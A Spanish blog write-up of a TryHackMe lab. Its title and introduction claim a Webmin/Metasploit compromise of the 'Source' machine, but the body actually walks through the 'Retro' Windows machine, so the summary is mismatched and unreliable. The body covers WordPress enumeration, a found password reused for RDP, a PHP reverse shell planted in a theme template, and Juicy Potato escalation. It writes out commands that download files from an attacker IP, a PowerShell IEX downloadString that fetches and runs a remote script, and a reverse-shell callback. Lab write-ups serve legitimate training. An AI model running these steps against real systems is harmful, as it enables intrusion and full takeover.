---
layout: single
title: "Source - Try Hack Me"
excerpt: "En este write-up, exploraremos la máquina 'Source' en la plataforma TryHackMe. Durante la investigación, descubrimos una aplicación web vulnerable llamada Webmin, que se utilizó para obtener acceso a la máquina. Utilizamos un exploit de Metasploit para explotar la vulnerabilidad y ganar acceso a los sistemas y datos de la máquina."
date: 2023-01-13
classes: wide
header:
 teaser: /assets/images/THM/source/source.png
 teaser_home_page: true
 icon: /assets/images/thm.webp
categories:
  - THM
  - Linux
tags:
  - hacking web
  - 
---

![](/assets/images/THM/source/source.png)

## Introducción

En este write-up, exploraremos la máquina "Source" en la plataforma TryHackMe. Durante la investigación, descubrimos una aplicación web vulnerable llamada Webmin, que se utilizó para obtener acceso a la máquina. Utilizamos un exploit de Metasploit para explotar la vulnerabilidad y ganar acceso a los sistemas y datos de la máquina.

## Enumeración

Para empezar con la enumeración, siempre lanzo un ping a la maquina objetivo para saber su estado, encendida o no y ademas ver su TTL para saber con que sistema operativo me encuentro

Comando para lanzar el ping 

`ping -c 1 <IP Victima>`

Pero leyendo la informacion de la maquina, nos dice que esta maquina no responde al comando ping, por lo que podria hacer uso de alguna herramienta que me permita ejecutar un ping, entonces haciendo uso de una herramienta que esta en github y se llama [Tcp Ping](https://github.com/cloverstd/tcping), con ella intentare lanzar un ping a ver que nos dice

![](/assets/images/THM/retro/1.png)

El resultado es que si esta activa, asi que pase a usar nmap y hacer un escaneo potente con el siguiente comando.

`nmap -p- --open -sS --min-rate 5000 -n -Pn -v -sCV -oN targeted <IP-Objetivo>`

Este comando es un escaneo intensivo que busca todos los puertos abiertos en la dirección IP objetivo. Algunos de los parámetros utilizados incluyen:

* -p- : Escanea todos los puertos
* --open : Solo muestra los puertos abiertos
* -sS : Realiza un escaneo TCP SYN
* -n : Desactiva la resolución de nombres
* -Pn : Supone que todos los hosts están activos
* -v : Muestra información detallada
* -sCV : Realiza un escaneo de detección de versión
* -oN : Guarda el resultado en un archivo de texto

![](/assets/images/THM/retro/2.png)

Despues de la enumeración realizada vi que hay dos puertos abiertos en esta maquina objetivo y son

* Puerto 80 
* Puerto 3389

Cuando trabajo con máquinas Windows, suelo agregar una línea en el archivo /etc/hosts que asocia el nombre de la máquina con su dirección IP. Esto puede ser útil para facilitar la identificación y acceso a la máquina en cuestión y mejorar la eficiencia de los procesos de enumeración y explotación.

```
# Agregar una entrada al archivo /etc/hosts
sudo nano /etc/hosts

# Añadir una línea con la dirección IP y el nombre de la máquina
<IP-Objetivo> <Nombre-de-la-Máquina>
```

Y ingreso al dominio desde la web.

![](/assets/images/THM/retro/3.png)

Me encontre con IIS "Internet Information Services", un servidor web de Windows por defecto, así que use fuerza bruta de rutas de directorios con la herramienta [Go Buster](https://github.com/OJ/gobuster)

Comando de Go Buster

`gobuster dir -u http://retro.thm -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 --no-error`

El comando `gobuster dir` es una herramienta de descubrimiento de directorios que se utiliza para enumerar y descubrir directorios y archivos en un servidor web. La opción `-u` especifica la URL base a la que se realizará la petición. En este caso, se está utilizando http://retro.thm.

La opción `-w` especifica un archivo de lista de palabras que se usará como diccionario para la búsqueda de directorios. En este caso, se está utilizando un archivo llamado `directory-list-2.3-medium.txt` ubicado en `/usr/share/SecLists/Discovery/Web-Content/`.

La opción `-t` especifica el número de hilos que se utilizarán para realizar las peticiones. En este caso, se está utilizando un valor de `100` hilos.

La opción `--no-error` especifica que no se deben mostrar mensajes de error.

![](/assets/images/THM/retro/4.png)

El resultado del escaneo es una ruta de acceso encontrada en el servidor del puerto 80.

Ingresé 

![](/assets/images/THM/retro/5.png)

Hice uso de la herramienta What Web que es la que nos brinda detalles relevantes sobre un sitio web específico.

![](/assets/images/THM/retro/6.png)

Pude ver que el servidor esta corriendo Wordpress en la version 5.2.1

Pase a buscar exploits para ese WordPress en searchsploit

![](/assets/images/THM/retro/7.png)

Por lo que intenté otro escaneo de gobuster pero incluyendo la ruta /retro y que busque archivos por extension con la opcion `-x`

![](/assets/images/THM/retro/8.png)

Vemos la ruta del panel de inicio de inicio de sesion de wordpress y efectivamente es el panel.

![](/assets/images/THM/retro/9.png)

Buscando en la pagina algun posible usuario, encontré uno que resalto y era Wade y siguiendo buscando, encontre 1 comentario a uno de los post y el comentario al final decia parzival

![](/assets/images/THM/retro/10.png)

![](/assets/images/THM/retro/11.png)

Podemos ver que el usuario existe por este simple error de la version que tiene el wordpress, entonces probé con la palabra `parzival` que anteriormente vi en el comentario al post de Wade

Y efectivo `parzival` es la contraseña del usuario Wade en Wordpress.

![](/assets/images/THM/retro/12.png)

Recordando que el puerto 3389 estaba abierto pase a probar en el servicio RDP las credenciales de WordPress.

Con el siguiente comando puedo acceder a ese servicio con una interfaz grafica

`xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:retro.thm /u:wade /p:'parzival'`

![](/assets/images/THM/retro/13.png)

Aqui ya pude obtener la primer flag que es `user.txt`

## Escalada de Privilegios

Abri una shell y comence a revisar informacion del sistemas, los usuarios, grupos y permisos que hay con el usuario Wade

![](/assets/images/THM/retro/14.png)

![](/assets/images/THM/retro/15.png)

![](/assets/images/THM/retro/16.png)

Con estos resultados pude ver que el usuario no tiene privilegios para usar algun ataque de escalada de privilegios, tambien vi que estamos en Windows Server 2016 y tambien vi la version del SO.

Por lo que intente probar un ataque con Juicy Potato al privilegio SeImpersonatePrivilege, pero para poder hacer ese ataque tuve que encontrar una cuenta de bajos privilegios que tuviera el privilegio SeImpersonatePrivilege.

Entonces lo que hice fue conseguir una reverse shell en php desde el WordPress de la siguiente manera; Editando una de las plantillas de la pagina, que esta en lenguaje php, por lo que edite la plantilla `index.php` y borre su contenido y lo que hice despues fue pegar un script de una [reverse shell](https://github.com/ivan-sincek/php-reverse-shell) en php.

![](/assets/images/THM/retro/17.png)

En ese script se debe cambiar la dirección IP y el puerto, donde queremos obtener la reverse shell, despues de eso, guardamos la plantilla.

Despues de haber cambiado los parametros anteriores y haber guardado la edicion del tema; en una ventana de consola en nuestra maquina, ejecutamos un netcat de escucha 

![](/assets/images/THM/retro/18.png)

Entonces ya teniendo estos pasos, recargo la pagina inicial del servicio web y reviso el netcat de escucha a ver si ya tenia la reverse shell

![](/assets/images/THM/retro/19.png)

De nuevo reviso la informacion de sistema, los usuarios y permisos

![](/assets/images/THM/retro/20.png)

Aqui obtuve la reverse shell con otro usuario y es el usuario retro, y este usuario si tiene el privilegio SeImpersonatePrivilege, así que intente un ataque juicy potato en esta shell del usuario retro.

Suelo crearme un directorio temp en la raiz del sistema y poder ahi trabajar de forma organizada

```
C:\inetpub\wwwroot\retro>cd C:\                                                      

C:\>mkdir temp

C:\>cd temp

C:\temp>
```

### Juicy Potato

Primero, descargue el exploit en su ultima version [aquí](https://github.com/ohpe/juicy-potato/releases)

Segundo, lo transferí a la maquina objetivo de la siguiente forma.

* Montando un servidor http desde la ruta del directorio donde se encuentra el exploit descargado.

  ![](/assets/images/THM/retro/21.png)

* Desde la consola Windows me descargo el archivo con el siguiente comando

  `Invoke-WebRequest http://<IP Atacante>/JuicyPotato.exe -OutFile jp.exe`

  ![](/assets/images/THM/retro/22.png)

Ejecutamos el exploit para ver si se ejecuta bien.

![](/assets/images/THM/retro/23.png)

En este punto necesitaba otro shell inverso que hara que obtengamos una shell SYSTEM de nuestro lado, haciendo uso de esta [Shell Inversa](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) de Nishang.

Me la descargue en mi maquina, y luego edite el archivo añadiendo a la ultima linea el siguiente comando:

`Invoke-PowerShellTcp -Reverse -IPAddress <IP Atacante> -Port <port>`

![](/assets/images/THM/retro/24.png)

Ahora lo que hice fue tranferir este archivo a la maquina objetivo 

![](/assets/images/THM/retro/25.png)

![](/assets/images/THM/retro/26.png)

Ya despues de tener eso, necesitaba algo que ejecutara el shell inverso por lo que tuve que crear en mi maquina un archivo .bat con la siguiente intruccion de comandos `PowerShell “IEX(New-Object Net.WebClient).downloadString(‘http://<IP>/Invoke-PowerShellTcp.ps1')"`

Y luego ese archivo transferirlo a la maquina objetivo.

![](/assets/images/THM/retro/27.png)

![](/assets/images/THM/retro/28.png)

Tambien puse un netcat en escucha en mi maquina, para cuando lance el JuicyPotato, obtenga la shell SYSTEM

![](/assets/images/THM/retro/31.png)


Entonces lance el siguiente comando del exploit para asi generar la shell inversa en nuestra maquina

![](/assets/images/THM/retro/30.png)

Y cuando revise el netcat de escucha ya tenia la shell inversa

![](/assets/images/THM/retro/29.png)

Aqui ya podemos obtener la flag de `root.txt` para completar la tarea de TryHackMe

![](/assets/images/THM/retro/32.png)



